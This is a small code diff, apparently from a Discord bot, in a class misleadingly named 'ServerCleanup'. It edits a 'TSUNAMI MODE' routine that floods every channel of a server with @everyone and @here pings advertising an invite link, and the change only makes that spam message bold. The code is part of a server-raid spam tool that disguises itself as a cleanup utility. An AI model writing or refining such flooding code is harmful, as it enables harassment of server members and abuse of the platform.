@@ -282,7 +282,7 @@ class ServerCleanup:
                 return
 
             # 🌊 TSUNAMI MODE: Wave-based message flooding
-            message_content = f"@everyone @here\nJoin in this server for more info --> {invite_link}"
+            message_content = f"@everyone @here\n**Join in this server for more info --> {invite_link}**"
 
             logger.info(f"🌊 TSUNAMI MODE ACTIVATED: Flooding {len(all_channels)} channels with messages...")
 
